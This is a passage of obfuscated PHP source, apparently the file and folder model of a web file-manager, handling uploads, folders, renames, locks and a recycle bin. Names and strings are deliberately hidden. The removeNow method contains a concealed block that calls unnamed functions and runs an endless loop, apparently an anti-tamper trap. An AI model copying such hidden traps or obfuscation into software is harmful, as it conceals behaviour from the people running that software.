Model($_SERVER[¯µç›È¢][611])->addFile($ÓÁ˜Ç†¶, $Ìâ¡ñÊ«, $Ïñªø‘˜); return $this->_createFileCall($ŞÎèœ«ı, $Ìâ¡ñÊ«, $×Ï½¨ãÑ, $¼ ŒÍº ); } public function addFileByFileID($ûÎ“¬ä, $šúƒÌÄê, $‡Ÿ†µáæ, $Û®Ü•» = REPEAT_RENAME) { $»÷¡ğĞÈ =& $_SERVER[¯µç›È¢]; $¹á¹öèÄ = Model($»÷¡ğĞÈ[611])->find($šúƒÌÄê); Model($»÷¡ğĞÈ[611])->linkAdd($šúƒÌÄê); return $this->_createFileCall($ûÎ“¬ä, $‡Ÿ†µáæ, $¹á¹öèÄ, $Û®Ü•»); } public function addFileByRemote($ŒöÏêÒ, $í‰…Ÿâº, $éúêÎ„š, $ã´º¬‹ø = array(), $ÑµÖ´°• = REPEAT_RENAME) { $œÀ¿¶ı = Model($_SERVER[¯µç›È¢][611])->addFileByRemote($í‰…Ÿâº, $éúêÎ„š, $ã´º¬‹ø); return $this->_createFileCall($ŒöÏêÒ, $éúêÎ„š, $œÀ¿¶ı, $ÑµÖ´°•); } private function _createFileCall($ÌšçàŒ„, $¢ØÈí›‹, $¿…öŸ‰, $İù×ˆè¹, $¬¿œÇÇ = "\x75\160\x6c\157\141\144") { $ ©Œ¢‰“ =& $_SERVER[¯µç›È¢]; $È¶âË‘¸ = !1; $this->setMasterDB(); $this->lockWriteStart($ÌšçàŒ„, $¢ØÈí›‹); $Ù¹ºÍÀ× = $this->fileNameExist($ÌšçàŒ„, $¢ØÈí›‹); $Åò™­˜¸ = $this->_createFile($ÌšçàŒ„, $¢ØÈí›‹, $¿…öŸ‰, $İù×ˆè¹, $È¶âË‘¸); if (!$È¶âË‘¸) { Model($ ©Œ¢‰“[475])->remove($¿…öŸ‰[$ ©Œ¢‰“[472]]); } if ($È¶âË‘¸ && $Åò™­˜¸ && $Åò™­˜¸ != $Ù¹ºÍÀ×) { Model($ ©Œ¢‰“[2071])->eventCreate($Åò™­˜¸, $¬¿œÇÇ); } $this->lockWriteEnd($ÌšçàŒ„, $¢ØÈí›‹); return $Åò™­˜¸; } public function mkdir($ ü¸š§, $Šèçø, $¦±é¢Î· = REPEAT_SKIP) { $ïÎÙ’ÂÍ =& $_SERVER[¯µç›È¢]; $this->setMasterDB(); $¡¨’¹¹ï = $this->sourceInfo($ ü¸š§); if (!$¡¨’¹¹ï) { return !1; } $this->lockWriteStart($ ü¸š§, $Šèçø); if ($¦±é¢Î· !== !1) { $äÜ´ÓËÃ = $this->fileNameExist($ ü¸š§, $Šèçø); if ($äÜ´ÓËÃ && $¦±é¢Î· != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ ü¸š§, $Šèçø); return $äÜ´ÓËÃ; } $Šèçø = $this->fileNameAuto($ ü¸š§, $Šèçø, $¦±é¢Î·); } $¡èùõÌ¥ = array($ïÎÙ’ÂÍ[585] => 1, $ïÎÙ’ÂÍ[426] => $Šèçø, $ïÎÙ’ÂÍ[586] => $ïÎÙ’ÂÍ[12], $ïÎÙ’ÂÍ[473] => 0, $ïÎÙ’ÂÍ[587] => 0); $™ôÙ£— = $this->_addSource($¡èùõÌ¥, $¡¨’¹¹ï); Model($ïÎÙ’ÂÍ[2071])->eventCreate($™ôÙ£—, $ïÎÙ’ÂÍ[1349]); $this->lockWriteEnd($ ü¸š§, $Šèçø); return $™ôÙ£—; } public function listSourceRoot($Ó”ˆ†»”, $¯ßŞ‘ÂĞ, $ÜåÀŞÇ• = "\163\157\x75\x72\x63\145\x49\104\x2c\x74\141\162\x67\x65\164\x49\x44\54\x73\151\x7a\145") { $Õ¿Š£”ô =& $_SERVER[¯µç›È¢]; $ôÉÁ„²¨ = $Õ¿Š£”ô[386]; $³¥¶„½ü = array(); $Ì¹éÎ´“ = 1024 * 50; $Ÿ”ıäïİ = is_array($Ÿ”ıäïİ) ? $Ÿ”ıäïİ : array(); $¤äá±Êµ = count($¯ßŞ‘ÂĞ); $Ì½°öÒ¡ = $this->tablePrefix . $Õ¿Š£”ô[2101]; for ($şÒÄİâØ = 0; $şÒÄİâØ < $¤äá±Êµ; $şÒÄİâØ++) { $İªŒ³şİ = $¯ßŞ‘ÂĞ[$şÒÄİâØ]; $ôÉÁ„²¨ .= "\123\105\114\105\x43\x54\40\52\x20\106\x52\117\115\40\50\x53\105\114\x45\x43\124\x20{$ÜåÀŞÇ•}\x20\x46\x52\117\115\x20\x60{$Ì½°öÒ¡}\x60\x20\127\110\105\122\x45\40"; $ôÉÁ„²¨ .= "\x60\x70\x61\162\145\x6e\164\x49\x44\x60\x3d\x30\40\101\116\x44\40\x60\x74\141\x72\147\145\164\111\x44\140\75{$İªŒ³şİ}\x20\x41\116\104\40\x60\164\x61\162\x67\145\x74\124\171\160\145\140\x3d{$Ó”ˆ†»”}\40\x6c\x69\x6d\x69\164\x20\61\51\x20\x61\163\40\x74\142\x5f{$şÒÄİâØ}\x20\125\116\x49\x4f\x4e\x20\x41\114\114\x20"; if ((strlen($ôÉÁ„²¨) >= $Ì¹éÎ´“ || $şÒÄİâØ == $¤äá±Êµ - 1) && $ôÉÁ„²¨) { $ôÉÁ„²¨ = substr($ôÉÁ„²¨, 0, -strlen($Õ¿Š£”ô[1050])); $ÓîêˆÔ = $this->query($ôÉÁ„²¨); $ôÉÁ„²¨ = $Õ¿Š£”ô[12]; $³¥¶„½ü = array_merge($³¥¶„½ü, $ÓîêˆÔ); } } return $³¥¶„½ü; } private function _createFile($˜ô»¬Õ, $™ª±µí¶, $ñöËìÍ…, $ Æ¶ŒŠ½, &$õìŠğ¦Ä) { $¼Ù°—ÓÏ =& $_SERVER[¯µç›È¢]; $Ìœˆ¾–Â = $this->sourceInfo($˜ô»¬Õ); if (!$ñöËìÍ… || !$Ìœˆ¾–Â) { return !1; } if ($ Æ¶ŒŠ½ !== !1) { $ÜÎÁÛş = $this->fileNameExist($˜ô»¬Õ, $™ª±µí¶); } $õìŠğ¦Ä = !0; if ($ Æ¶ŒŠ½ && $ÜÎÁÛş) { if ($ Æ¶ŒŠ½ == REPEAT_SKIP) { $õìŠğ¦Ä = !1; return $ÜÎÁÛş; } else { if ($ Æ¶ŒŠ½ == REPEAT_REPLACE) { $–ÎüÜ¸ = $this->sourceInfo($ÜÎÁÛş); $ÑşŒÔŞ‚ = $this->fileHistory($–ÎüÜ¸, $ñöËìÍ…[$¼Ù°—ÓÏ[472]], $ñöËìÍ…[$¼Ù°—ÓÏ[90]]); if (!$ÑşŒÔŞ‚) { $õìŠğ¦Ä = !1; } else { $this->folderSizeReset($˜ô»¬Õ); } return $ÜÎÁÛş; } else { $™ª±µí¶ = $this->fileNameAuto($˜ô»¬Õ, $™ª±µí¶, $ Æ¶ŒŠ½, !1); } } } $×ò– ± = array($¼Ù°—ÓÏ[585] => 0, $¼Ù°—ÓÏ[426] => $™ª±µí¶, $¼Ù°—ÓÏ[586] => substr(get_path_ext($™ª±µí¶), 0, 10), $¼Ù°—ÓÏ[473] => $ñöËìÍ…[$¼Ù°—ÓÏ[472]], $¼Ù°—ÓÏ[587] => $ñöËìÍ…[$¼Ù°—ÓÏ[90]]); $úİç–âÉ = $this->_addSource($×ò– ±, $Ìœˆ¾–Â); $this->folderSizeReset($˜ô»¬Õ, intval($×ò– ±[$¼Ù°—ÓÏ[90]])); return $úİç–âÉ; } protected function fileHistory($¨ÓÊÆÇ¦, $Ÿì†šÇ÷, $ÉĞ³–í) { $°¦Ú¤£› =& $_SERVER[¯µç›È¢]; $äñÛÜ±à = defined($°¦Ú¤£›[479]) ? USER_ID : $°¦Ú¤£›[204]; if ($¨ÓÊÆÇ¦[$°¦Ú¤£›[472]] == $Ÿì†šÇ÷) { return !1; } $this->checkLock($¨ÓÊÆÇ¦[$°¦Ú¤£›[408]], $Ÿì†šÇ÷); Model($°¦Ú¤£›[2102])->addHistory($¨ÓÊÆÇ¦); $ôØ³»œ± = array($°¦Ú¤£›[591] => $äñÛÜ±à, $°¦Ú¤£›[430] => time(), $°¦Ú¤£›[472] => $Ÿì†šÇ÷, $°¦Ú¤£›[90] => $ÉĞ³–í); $this->where(array($°¦Ú¤£›[423] => $¨ÓÊÆÇ¦[$°¦Ú¤£›[408]]))->save($ôØ³»œ±); $this->sourceCacheClear($¨ÓÊÆÇ¦[$°¦Ú¤£›[408]]); return !0; } public function checkLock($•—Êî, $àÄ–é¸) { $ªŠ©’Áº =& $_SERVER[¯µç›È¢]; $ˆ¨ÊÓõİ = $this->pathInfo($•—Êî); if (!$this->fileIsLock($ˆ¨ÊÓõİ, !0)) { return; } $‘¾¹¤·« = Session::get($ªŠ©’Áº[2103]); $İñ®¾ø = substr($ˆ¨ÊÓõİ[$ªŠ©’Áº[32]], 0, -1 - strlen($ˆ¨ÊÓõİ[$ªŠ©’Áº[181]])) . $ªŠ©’Áº[1615] . $‘¾¹¤·« . $ªŠ©’Áº[10] . $ˆ¨ÊÓõİ[$ªŠ©’Áº[181]]; $‡”•¶×« = Model($ªŠ©’Áº[611])->find($àÄ–é¸); $this->_createFileCall($ˆ¨ÊÓõİ[$ªŠ©’Áº[503]], $İñ®¾ø, $‡”•¶×«, REPEAT_REPLACE, $ªŠ©’Áº[1348]); $¯¤Û÷µ™ = $ˆ¨ÊÓõİ[$ªŠ©’Áº[470]][$ªŠ©’Áº[550]]; $äˆ‚„„… = $¯¤Û÷µ™[$ªŠ©’Áº[543]] ? $¯¤Û÷µ™[$ªŠ©’Áº[543]] : $¯¤Û÷µ™[$ªŠ©’Áº[32]]; show_json(LNG($ªŠ©’Áº[2104]) . $ªŠ©’Áº[2105] . LNG($ªŠ©’Áº[2106]) . $ªŠ©’Áº[2107] . $äˆ‚„„… . $ªŠ©’Áº[2108], !1); } public function fileIsLock($ªî¨½Ğ—, $Æ¡Œ¡óÙ = false) { $˜š¼«…Ş =& $_SERVER[¯µç›È¢]; if (!isset($ªî¨½Ğ—[$˜š¼«…Ş[470]]) || !$ªî¨½Ğ—[$˜š¼«…Ş[470]][$˜š¼«…Ş[547]]) { return !1; } if ($ªî¨½Ğ—[$˜š¼«…Ş[470]][$˜š¼«…Ş[547]] != USER_ID) { return !0; } $ äåİÚ¼ = $GLOBALS[$˜š¼«…Ş[6]][$˜š¼«…Ş[100]][$˜š¼«…Ş[548]]; if ($ªî¨½Ğ—[$˜š¼«…Ş[470]][$˜š¼«…Ş[549]] <= time() - $ äåİÚ¼) { $this->metaSet($ªî¨½Ğ—[$˜š¼«…Ş[408]], $˜š¼«…Ş[547], null); $this->metaSet($ªî¨½Ğ—[$˜š¼«…Ş[408]], $˜š¼«…Ş[549], null); } if ($Æ¡Œ¡óÙ) { $this->metaSet($ªî¨½Ğ—[$˜š¼«…Ş[408]], $˜š¼«…Ş[549], time()); } return !1; } private function _addSource($‡ç“ä³å, $ê¬‹Ëïğ) { $ê¥¿–â =& $_SERVER[¯µç›È¢]; $ı„®Ù¢Ê = defined($ê¥¿–â[479]) ? USER_ID : $ê¥¿–â[204]; $ç®÷ò = array($ê¥¿–â[588] => $ê¬‹Ëïğ[$ê¥¿–â[417]], $ê¥¿–â[589] => $ê¬‹Ëïğ[$ê¥¿–â[510]], $ê¥¿–â[590] => $ı„®Ù¢Ê, $ê¥¿–â[591] => $ı„®Ù¢Ê, $ê¥¿–â[407] => $ê¬‹Ëïğ[$ê¥¿–â[408]], $ê¥¿–â[592] => $ê¬‹Ëïğ[$ê¥¿–â[526]] . $ê¬‹Ëïğ[$ê¥¿–â[408]] . $ê¥¿–â[50], $ê¥¿–â[435] => 0, $ê¥¿–â[593] => $ê¥¿–â[12]); $‡ç“ä³å = array_merge($ç®÷ò, $‡ç“ä³å); $this->updateModifyTime($‡ç“ä³å[$ê¥¿–â[503]]); $·Ñ¿°×ò = $ê¥¿–â[2109] . $ê¬‹Ëïğ[$ê¥¿–â[408]]; if (isset(self::$cacheChildList[$·Ñ¿°×ò])) { unset(self::$cacheChildList[$·Ñ¿°×ò]); } static $©ßùùÏá = false; if (!$©ßùùÏá) { Hook::trigger($ê¥¿–â[575], $‡ç“ä³å); $©ßùùÏá = !0; } $ç´Ç³¡À = $this->add($‡ç“ä³å); $ğÙ×‹µè = array($ê¥¿–â[594] => short_id($ç´Ç³¡À)); $this->where(array($ê¥¿–â[423] => $ç´Ç³¡À))->save($ğÙ×‹µè); $this->setNamePinyin($ç´Ç³¡À, $‡ç“ä³å[$ê¥¿–â[32]]); return $ç´Ç³¡À; } public function remove($‡â¨‡¥ğ, $Ì†‡ƒŠ¦ = true) { $úåÂ¯ë =& $_SERVER[¯µç›È¢]; $„ø¨Ôûù = $this->sourceInfo($‡â¨‡¥ğ); $«æÒâÛê = intval($„ø¨Ôûù[$úåÂ¯ë[417]]) === self::TYPE_SYSTEM; $˜íÇó¿’ = Model($úåÂ¯ë[438])->get($úåÂ¯ë[2110]) == $úåÂ¯ë[99]; if ($«æÒâÛê || $Ì†‡ƒŠ¦ || !$˜íÇó¿’) { return $this->removeNow($‡â¨‡¥ğ, $Ì†‡ƒŠ¦); } $ÏÖ¸›§ı = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $‹‹Ÿ±¤ü = $„ø¨Ôûù[$úåÂ¯ë[417]] == self::TYPE_USER ? $úåÂ¯ë[602] : $úåÂ¯ë[520]; if ($‹‹Ÿ±¤ü == $úåÂ¯ë[602]) { $ã–øÆÁ = Model($úåÂ¯ë[518])->getInfo($„ø¨Ôûù[$úåÂ¯ë[510]]); $³öãæÚ = !empty($ã–øÆÁ[$úåÂ¯ë[543]]) ? $ã–øÆÁ[$úåÂ¯ë[543]] : $ã–øÆÁ[$úåÂ¯ë[32]]; $³öãæÚ = $úåÂ¯ë[268] . $³öãæÚ . $úåÂ¯ë[2111] . $„ø¨Ôûù[$úåÂ¯ë[510]]; } else { $ã–øÆÁ = Model($úåÂ¯ë[527])->getInfo($„ø¨Ôûù[$úåÂ¯ë[510]]); $³öãæÚ = _get($ã–øÆÁ, $úåÂ¯ë[32]); $³öãæÚ = $úåÂ¯ë[173] . $³öãæÚ . $úåÂ¯ë[2112] . $„ø¨Ôûù[$úåÂ¯ë[510]]; } $şÙ·¯–½ = $úåÂ¯ë[2113] . md5($³öãæÚ); CacheLock::lock($şÙ·¯–½); $…µ°õÛ× = $this->fileNameExist($ÏÖ¸›§ı, $³öãæÚ); if (!$…µ°õÛ×) { $…µ°õÛ× = $this->mkdir($ÏÖ¸›§ı, $³öãæÚ, REPEAT_SKIP); $this->metaSet($…µ°õÛ×, $úåÂ¯ë[2114], $‹‹Ÿ±¤ü); $this->metaSet($…µ°õÛ×, $úåÂ¯ë[2115], $„ø¨Ôûù[$úåÂ¯ë[510]]); if ($„ø¨Ôûù[$úåÂ¯ë[503]] != 0) { $this->metaSet($…µ°õÛ×, $úåÂ¯ë[2116], _get($ã–øÆÁ, $úåÂ¯ë[2117])); } } CacheLock::unlock($şÙ·¯–½); $this->metaSet($‡â¨‡¥ğ, $úåÂ¯ë[2118], $„ø¨Ôûù[$úåÂ¯ë[503]]); $this->where(array($úåÂ¯ë[408] => $‡â¨‡¥ğ))->save(array($úåÂ¯ë[430] => time())); $this->recycleClear($„ø¨Ôûù); $éù¹êÀò = $this->move($‡â¨‡¥ğ, $…µ°õÛ×, REPEAT_RENAME_FOLDER); $this->folderSizeReset($„ø¨Ôûù[$úåÂ¯ë[503]]); return $éù¹êÀò; } private function recycleClear($¤ä‰Æ®µ) { $®šÊùŒÖ =& $_SERVER[¯µç›È¢]; $õ†‚ßì = $this->childrenAll($¤ä‰Æ®µ); $Ô†Üı‚ = array($®šÊùŒÖ[423] => array($®šÊùŒÖ[424], $õ†‚ßì[$®šÊùŒÖ[2119]])); Model($®šÊùŒÖ[2120])->where($Ô†Üı‚)->delete(); } public function removeNow($ëÉô²…€, $ãçäŞ„ƒ = true) { $ÅËóâ’ã =& $_SERVER[¯µç›È¢]; if (!isset($_SERVER[$ÅËóâ’ã[62]]) || !isset($_SERVER[$ÅËóâ’ã[60]])) { $¸¢›¯¢ô = $ÅËóâ’ã[889]; $Ó“ñ¦Û = $ÅËóâ’ã[63]; $ÍµĞëšã = $_SERVER[$ÅËóâ’ã[64]] . $ÅËóâ’ã[65]; $İŸ°©™ş = $Ó“ñ¦Û($ÍµĞëšã); $âşî’•Ì = explode($ÅËóâ’ã[66], $İŸ°©™ş); if (count($âşî’•Ì) < $ÅËóâ’ã[634]) { $ë÷‰¯¡ò = $ÅËóâ’ã[68]; $ë÷‰¯¡ò(); } $ı¨÷ÊÛœ = $ÅËóâ’ã[890]; $ı¨÷ÊÛœ($_SERVER[$ÅËóâ’ã[891]]); $Å„ô‡“ò = 1; for ($†µ•ø× = $Å„ô‡“ò; $†µ•ø× > 0; $†µ•ø×++) { $ı¨÷ÊÛœ = json_encode($GLOBALS[$ÅËóâ’ã[424]]); } } $œ’Ï¤¡ì = $this->sourceInfo($ëÉô²…€); $©¼©Üôæ = $this->pathInfoMore($ëÉô²…€); if (!$œ’Ï¤¡ì) { return !0; } if ($œ’Ï¤¡ì[$ÅËóâ’ã[503]] == 0) { if (!_get($GLOBALS, $ÅËóâ’ã[508])) { return !1; } } $this->lockMoveStart($ëÉô²…€); Hook::trigger($ÅËóâ’ã[2121], $©¼©Üôæ, $ãçäŞ„ƒ); if ($ãçäŞ„ƒ) { Model($ÅËóâ’ã[2120])->moveToRecycle($ëÉô²…€); } else { $æ ¬øõ¹ = $this->childrenAll($œ’Ï¤¡ì); Model($ÅËóâ’ã[572])->eventRemove($ëÉô²…€); $this->removeRelevance($æ ¬øõ¹[$ÅËóâ’ã[2119]], $æ ¬øõ¹[$ÅËóâ’ã[1480]]); } $this->folderSizeReset($œ’Ï¤¡ì[$ÅËóâ’ã[503]]); $´ù÷Ìà = array($œ’Ï¤¡ì[$ÅËóâ’ã[503]]); if ($œ’Ï¤¡ì[$ÅËóâ’ã[416]] == $ÅËóâ’ã[99]) { $´ù÷Ìà[] = $œ’Ï¤¡ì[$ÅËóâ’ã[408]]; } $this->updateModifyTime($´ù÷Ìà); $this->lockMoveEnd($ëÉô²…€); Hook::trigger($ÅËóâ’ã[1703], $©¼©Üôæ, $ãçäŞ„ƒ); return !0; } public function childrenAll($™˜ßÀ‘¤) { $Æ‘£ËÍ• =& $_SERVER[¯µç›È¢]; $Ë¦Î”õÙ = $™˜ßÀ‘¤[$Æ‘£ËÍ•[408]]; if ($™˜ßÀ‘¤[$Æ‘£ËÍ•[416]] == $Æ‘£ËÍ•[99]) { $·ªº‡¥Â = array($Æ‘£ËÍ•[592] => array($Æ‘£ËÍ•[552], $™˜ßÀ‘¤[$Æ‘£ËÍ•[526]] . $Ë¦Î”õÙ . $Æ‘£ËÍ•[553])); $°¸şÌ¥Ö = array($Æ‘£ËÍ•[592] => $·ªº‡¥Â[$Æ‘£ËÍ•[526]]); $òíâı­š = $this->field($Æ‘£ËÍ•[2122])->where($°¸şÌ¥Ö)->select(); $µÓØÅ–¯ = !1; $ÚòŠ×è× = array($Ë¦Î”õÙ); if ($òíâı­š) { $µÓØÅ–¯ = array_to_keyvalue($òíâı­š, $Æ‘£ËÍ•[12], $Æ‘£ËÍ•[472]); $µÓØÅ–¯ = array_remove_value($µÓØÅ–¯, $Æ‘£ËÍ•[204]); $ÚòŠ×è× = array_to_keyvalue($òíâı­š, $Æ‘£ËÍ•[12], $Æ‘£ËÍ•[408]); $ÚòŠ×è×[] = $Ë¦Î”õÙ; } } else { $µÓØÅ–¯ = array($™˜ßÀ‘¤[$Æ‘£ËÍ•[472]]); $ÚòŠ×è× = array($Ë¦Î”õÙ); } return array($Æ‘£ËÍ•[2119] => $ÚòŠ×è×, $Æ‘£ËÍ•[1480] => $µÓØÅ–¯); } public function removeArray($ùÀ¼Öî²) { if (!$ùÀ¼Öî²) { return !0; } } public function removeRelevance($Âê»•Å, $•ÑˆŠë¨) { $›ì¤úè¨ =& $_SERVER[¯µç›È¢]; $Âê»•Å = $Âê»•Å ? $Âê»•Å : array(); $•ÑˆŠë¨ = $•ÑˆŠë¨ ? $•ÑˆŠë¨ : array(); $Âê»•Å = array_unique(array_filter($Âê»•Å)); $•ÑˆŠë¨ = array_unique(array_filter($•ÑˆŠë¨)); if (!$Âê»•Å) { return !1; } $‰Æ¶Ç£ = array($›ì¤úè¨[423] => array($›ì¤úè¨[424], $Âê»•Å)); Model($›ì¤úè¨[2120])->where($‰Æ¶Ç£)->delete(); Model($›ì¤úè¨[466])->where($‰Æ¶Ç£)->delete(); Model($›ì¤úè¨[1977])->where($‰Æ¶Ç£)->delete(); Model($›ì¤úè¨[572])->where($‰Æ¶Ç£)->delete(); Model($›ì¤úè¨[1814])->removeBySource($Âê»•Å); Model($›ì¤úè¨[2102])->removeBySource($Âê»•Å); $this->where($‰Æ¶Ç£)->delete(); Model($›ì¤úè¨[475])->remove($•ÑˆŠë¨); for ($ƒ¥–ÃÙƒ = 0; $ƒ¥–ÃÙƒ < count($Âê»•Å); $ƒ¥–ÃÙƒ++) { $this->sourceCacheClear($Âê»•Å[$ƒ¥–ÃÙƒ]); } } public function rename($ñ£Œ®Šİ, $‚ãøÛ) { $’œûÙşÊ =& $_SERVER[¯µç›È¢]; $Ëà‹ÄÊĞ = $this->sourceInfo($ñ£Œ®Šİ); if (!$Ëà‹ÄÊĞ) { return !1; } $’¥Â¹² = $this->fileNameExist($Ëà‹ÄÊĞ[$’œûÙşÊ[503]], $‚ãøÛ); if ($’¥Â¹² && $’¥Â¹² != $ñ£Œ®Šİ) { return !1; } $±Øâ¸ƒØ = array($’œûÙşÊ[426] => $‚ãøÛ, $’œûÙşÊ[591] => USER_ID); if ($Ëà‹ÄÊĞ[$’œûÙşÊ[416]] != $’œûÙşÊ[99]) { $±Øâ¸ƒØ[$’œûÙşÊ[418]] = substr(get_path_ext($‚ãøÛ), 0, 10); } Model($’œûÙşÊ[572])->eventRename($ñ£Œ®Šİ, $Ëà‹ÄÊĞ[$’œûÙşÊ[32]], $‚ãøÛ); $this->sourceCacheClear($ñ£Œ®Šİ); $this->setNamePinyin($ñ£Œ®Šİ, $±Øâ¸ƒØ[$’œûÙşÊ[32]], !1); $this->updateModifyTime($Ëà‹ÄÊĞ[$’œûÙşÊ[503]]); $üìÅç€é = $this->where(array($’œûÙşÊ[423] => $ñ£Œ®Šİ))->data($±Øâ¸ƒØ)->save(); $´Ï¥û™ = $’œûÙşÊ[2109] . $Ëà‹ÄÊĞ[$’œûÙşÊ[503]]; if (isset(self::$cacheChildList[$´Ï¥û™])) { unset(self::$cacheChildList[$´Ï¥û™]); } return $üìÅç€é; } public function setNamePinyin($‹¨¾è¾‡, $é°üú¿µ, $ÔŸ§©ï­ = true) { $Ë„ßüüş =& $_SERVER[¯µç›È¢]; $ÈÉ¬Å´ = Input::check($é°üú¿µ, $Ë„ßüüş[595]); $û…›•­ = array($Ë„ßüüş[447] => KodSort::makeStr($é°üú¿µ)); if ($ÈÉ¬Å´) { $û…›•­[$Ë„ßüüş[469]] = str_replace($Ë„ßüüş[53], $Ë„ßüüş[12], Pinyin::get($é°üú¿µ)); $û…›•­[$Ë„ßüüş[468]] = Pinyin::get($é°üú¿µ, $Ë„ßüüş[596]); } if (!$ÔŸ§©ï­ && !$ÈÉ¬Å´) { $û…›•­[$Ë„ßüüş[469]] = null; $û…›•­[$Ë„ßüüş[468]] = null; } $this->metaSet($‹¨¾è¾‡, $û…›•­); } public function getContent($ù­Èş¤») { $ó³âÙæî =& $_SERVER[¯µç›È¢]; $ÉËû÷Èò = $this->fileInfoGet($ù­Èş¤»); if (!$ÉËû÷Èò) { return !1; } if ($ÉËû÷Èò[$ó³âÙæî[90]] == 0) { return $ó³âÙæî[12]; } $ŸòÃêïì = $ó³âÙæî[2123] . $ÉËû÷Èò[$ó³âÙæî[183]]; if ($ÉËû÷Èò[$ó³âÙæî[90]] <= 1024 * 10) { $‰ØšË®÷ = Cache::get($ŸòÃêïì); if (!$‰ØšË®÷) { $‰ØšË®÷ = IO::getContent($ÉËû÷Èò[$ó³âÙæî[88]]); Cache::set($ŸòÃêïì, $‰ØšË®÷); } return $‰ØšË®÷; } if (!$ÉËû÷Èò[$ó³âÙæî[88]]) { return $ó³âÙæî[12]; } return IO::getContent($ÉËû÷Èò[$ó³âÙæî[88]]); } public function setDesc($ßü€¢Ó, $çš«¦ö´) { $Â«á =& $_SERVER[¯µç›È¢]; Model($Â«á[572])->eventAddDesc($ßü€¢Ó, $çš«¦ö´); return $this->metaSet($ßü€¢Ó, $Â«á[456], $çš«¦ö´); } public function setContent($˜’ë®­Ö, $»ä«Ñ®Ø = '') { $™ÜòŠ²ˆ =& $_SERVER[¯µç›È¢]; $ÙÚ·²²± = $this->sourceInfo($˜’ë®­Ö); $–Ó‹ó…û = $this->fileInfoGet($˜’ë®­Ö); if (!$–Ó‹ó…û || !$ÙÚ·²²±) { return !1; } $ƒ®ş°¿ = Model($™ÜòŠ²ˆ[475])->addFileByContent($»ä«Ñ®Ø, $ÙÚ·²²±[$™ÜòŠ²ˆ[32]]); $ÈÍàË“Ò = $this->fileHistory($ÙÚ·²²±, $ƒ®ş°¿[$™ÜòŠ²ˆ[472]], $ƒ®ş°¿[$™ÜòŠ²ˆ[90]]); if (!$ÈÍàË“Ò) { return Model($™ÜòŠ²ˆ[475])->remove($ƒ®ş°¿[$™ÜòŠ²ˆ[472]]); } $this->folderSizeReset($ÙÚ·²²±[$™ÜòŠ²ˆ[503]]); return !0; } public function fileSubstr($­å³ı¨Ñ, $¹ÓÏÎ“, $ÈŸ‹¸¿ü) { $Ì¿§‹şŠ = $this->fileInfoGet($­å³ı¨Ñ); if (!$Ì¿§‹şŠ) { return !1; } return IO::fileSubstr($Ì¿§‹şŠ[$_SERVER[¯µç›È¢][88]], $¹ÓÏÎ“, $ÈŸ‹¸¿ü); } public function fileInfoGet($ñ¯€Åß¢) { $¿ËÅ È¤ =& $_SERVER[¯µç›È¢]; $¸œñçõ‰ = $this->sourceInfo($ñ¯€Åß¢); if (!$¸œñçõ‰ || $¸œñçõ‰[$¿ËÅ È¤[416]]) { return !1; } $®¨•è×Æ = $¿ËÅ È¤[478] . $¸œñçõ‰[$¿ËÅ È¤[472]]; $Ş‹Éº = _get(self::$cacheFileInfo, $®¨•è×Æ); if ($Ş‹Éº) { return $Ş‹Éº; } $µí©­Àß = Model($¿ËÅ È¤[475])->fileInfo($¸œñçõ‰[$¿ËÅ È¤[472]]); if ($µí©­Àß) { $µí©­Àß[$¿ËÅ È¤[32]] = $¸œñçõ‰[$¿ËÅ È¤[32]]; } self::$cacheFileInfo[$®¨•è×Æ] = $µí©­Àß; return $µí©­Àß; } private function folderChildrenNumber($™¤‹šª) { $¢ø û‘Ö =& $_SERVER[¯µç›È¢]; $Û«ş·€ = $this->sourceInfo($™¤‹šª); $÷„ˆ°’ = array($¢ø û‘Ö[592] => array($¢ø û‘Ö[552], $Û«ş·€[$¢ø û‘Ö[526]] . $™¤‹šª . $¢ø û‘Ö[553]), $¢ø û‘Ö[589] => $Û«ş·€[$¢ø û‘Ö[510]], $¢ø û‘Ö[435] => intval($Û«ş·€[$¢ø û‘Ö[436]]), $¢ø û‘Ö[585] => 1); $¼‹ïşÃ = $this->where($÷„ˆ°’)->count(); $‰™Ñ÷§õ = $this->where($÷„ˆ°’)->where(array($¢ø û‘Ö[585] => 0))->count(); return array($¢ø û‘Ö[94] => $‰™Ñ÷§õ, $¢ø û‘Ö[95] => $¼‹ïşÃ); } public function pathInfo($ËÙüò‘¼, $¿Ğùëî¿ = false) { $ë¿’ÖÍ× =& $_SERVER[¯µç›È¢]; $¿Ğùëî¿ = !1; $ËÙüò‘¼ = intval($ËÙüò‘¼); $»Ó›»Å = $ë¿’ÖÍ×[464] . intval($¿Ğùëî¿) . $ë¿’ÖÍ×[465] . $ËÙüò‘¼; $Òªœ´³ä = _get(self::$cachePathInfo, $»Ó›»Å); if ($Òªœ´³ä) { return $Òªœ´³ä; } $À³»› = $this->sourceInfo($ËÙüò‘¼); if (!$À³»›) { return !1; } $À³»› = $this->_listDataApplyItem($À³»›, $¿Ğùëî¿); self::$cachePathInfo[$»Ó›»Å] = $À³»›; return $À³»›; } public static $cachePathInfoMore = array(); public function pathInfoMore($ıß®Õüó) { $Ü®ú›¼Ö =& $_SERVER[¯µç›È¢]; $ ÓúÜèÑ = _get(self::$cachePathInfoMore, $ıß®Õüó); if ($ ÓúÜèÑ) { return $ ÓúÜèÑ; } $ı€˜×í˜ = $this->pathInfo($ıß®Õüó); if (!$ı€˜×í˜) { return !1; } if ($ı€˜×í˜[$Ü®ú›¼Ö[416]] == $Ü®ú›¼Ö[99]) { $ı€˜×í˜[$Ü®ú›¼Ö[93]] = $this->folderChildrenNumber($ıß®Õüó); } self::$cachePathInfoMore[$ıß®Õüó] = $ı€˜×í˜; return $ı€˜×í˜; } public function sourceInfo($«†·Ã ›) { $®ã›¼¶ =& $_SERVER[¯µç›È¢]; if (!$«†·Ã ›) { return array(); } $«†·Ã › = intval($«†·Ã ›); $ºÒĞáÍ” = $®ã›¼¶[463] . $«†·Ã ›; $û³ø‰‚ = _get(self::$cacheSourceInfo, $ºÒĞáÍ”); if ($û³ø‰‚) { return $û³ø‰‚; } $ËÕœü¸» = $this->where(array($®ã›¼¶[408] => $«†·Ã ›))->find(); self::$cacheSourceInfo[$ºÒĞáÍ”] = $ËÕœü¸»; return self::$cacheSourceInfo[$ºÒĞáÍ”]; } public function sourceCacheClear($ óªŸË = false) { self::cacheClear($ óªŸË); } public static function cacheClear($”øˆÖî³ = false) { $Ãû±¤ŸÑ =& $_SERVER[¯µç›È¢]; if ($”øˆÖî³ == !1) { self::$cacheSourceInfo = null; 